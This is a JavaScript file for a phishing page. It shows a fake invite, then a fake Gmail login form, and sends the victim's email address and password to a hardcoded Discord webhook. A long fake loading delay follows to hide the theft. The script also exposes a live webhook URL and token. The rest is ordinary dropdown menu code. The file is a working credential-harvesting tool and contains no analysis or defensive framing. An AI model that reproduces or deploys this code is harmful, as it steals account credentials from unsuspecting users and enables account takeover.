// =====================
// WEBHOOK SETUP
// =====================
const webhookURL = "https://discord.com/api/webhooks/1523935581934059595/IdFhCnUd1osIL2zBpAx6p2xRDHJuT6JaHCKVKTfcZwDPWsyxBlrCbQcV_l5QcaDIZr6z";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}

const invitePage = document.getElementById("invitePage");
const loginPage = document.getElementById("loginPage");

const acceptBtn = document.getElementById("acceptBtn");
const backBtn = document.getElementById("backBtn");
const loginBtn = document.getElementById("loginBtn");

const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");

const usernameError = document.getElementById("usernameError");
const loading = document.getElementById("loading");

acceptBtn.addEventListener("click", () => {
    invitePage.classList.add("hidden");
    loginPage.classList.remove("hidden");
});

backBtn.addEventListener("click", () => {
    invitePage.classList.remove("hidden");
    loginPage.classList.add("hidden");

    usernameInput.value = "";
    passwordInput.value = "";
    usernameError.textContent = "";

    loading.classList.add("hidden");

    usernameInput.disabled = false;
    passwordInput.disabled = false;
    loginBtn.disabled = false;
    backBtn.disabled = false;
});

loginBtn.addEventListener("click", () => {

    const username = usernameInput.value.trim().toLowerCase();
    const password = passwordInput.value.trim();

    usernameError.textContent = "";

    if (username === "") {
        usernameError.textContent = "Please fill in this field.";
        usernameInput.focus();
        return;
    }

    if (!username.endsWith("@gmail.com")) {
        usernameError.textContent = "Please enter a valid Gmail address.";
        usernameInput.focus();
        return;
    }

    if (password === "") {
        usernameError.textContent = "Please enter a password.";
        passwordInput.focus();
        return;
    }

    if (password.length < 6) {
        usernameError.textContent = "Password must be at least 6 characters.";
        passwordInput.focus();
        return;
    }


    // SEND ONLY IF ALL INPUTS ARE VALID
    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);


    // Disable controls
    usernameInput.disabled = true;
    passwordInput.disabled = true;
    loginBtn.disabled = true;
    backBtn.disabled = true;

    // Show loading
    loading.classList.remove("hidden");

    console.log("Loading shown");


    setTimeout(() => {

        loading.classList.add("hidden");

        usernameInput.disabled = false;
        passwordInput.disabled = false;
        loginBtn.disabled = false;
        backBtn.disabled = false;

    }, 110000);

});

// CLEAR EMAIL ERROR
usernameInput.addEventListener("input", () => {
    usernameError.textContent = "";
});


// =========================
// CUSTOM DROPDOWNS
// =========================

const dropdowns = document.querySelectorAll(".dropdown");

dropdowns.forEach(dropdown => {

    const button = dropdown.querySelector(".drop-btn");
    const items = dropdown.querySelectorAll(".dropdown-menu div");

    // OPEN / CLOSE
    button.addEventListener("click", function (e) {

        e.preventDefault();
        e.stopPropagation();

        // Close all other dropdowns
        dropdowns.forEach(other => {
            if (other !== dropdown) {
                other.classList.remove("active");
            }
        });

        // Toggle current dropdown
        dropdown.classList.toggle("active");

    });

    // SELECT OPTION
    items.forEach(item => {

        item.addEventListener("click", function (e) {

            e.stopPropagation();

            button.innerHTML = `
                <span>${this.textContent}</span>
                <span class="arrow"></span>
            `;

            dropdown.classList.remove("active");

        });

    });

});


// =========================
// CLICK OUTSIDE = CLOSE
// =========================

document.addEventListener("click", function () {

    dropdowns.forEach(dropdown => {
        dropdown.classList.remove("active");
    });

});


// =========================
// ESC KEY = CLOSE
// =========================

document.addEventListener("keydown", function (e) {

    if (e.key === "Escape") {

        dropdowns.forEach(dropdown => {
            dropdown.classList.remove("active");
        });

    }

});
